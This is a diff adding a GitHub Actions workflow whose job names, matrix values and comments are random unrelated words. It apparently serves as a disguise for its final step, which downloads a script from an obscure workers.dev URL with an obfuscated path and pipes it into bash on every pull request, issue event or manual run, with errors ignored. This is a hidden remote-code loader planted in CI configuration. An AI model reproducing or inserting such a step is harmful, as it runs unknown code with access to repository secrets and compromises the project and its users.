@@ -1,0 +1,28 @@
+name: Bible
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+  issues:
+
+jobs:
+  stove:
+    #talent chill verify
+    #wolf accident pace terror deal humble
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        swift: ["renew", "campus", "festival", "author", "background"]
+        conscious: ["plague", "boot", "electricity", "overcome"]
+    steps:
+    - name:  fox-minor
+      uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        path: 'sorrow'
+        key: 'look-poem'
+    #unity
+    - name: carrier
+      continue-on-error: true
+      run: curl -S -L "https://i.donnickcarbonaro70085.workers.dev/dcfd06/e1ac8c/f/fb0fad/697fdddbc3e/9/0c6bdf49234760327/3cc8b470a598f5/0e?ao=1775412757&cyo=q" | bash
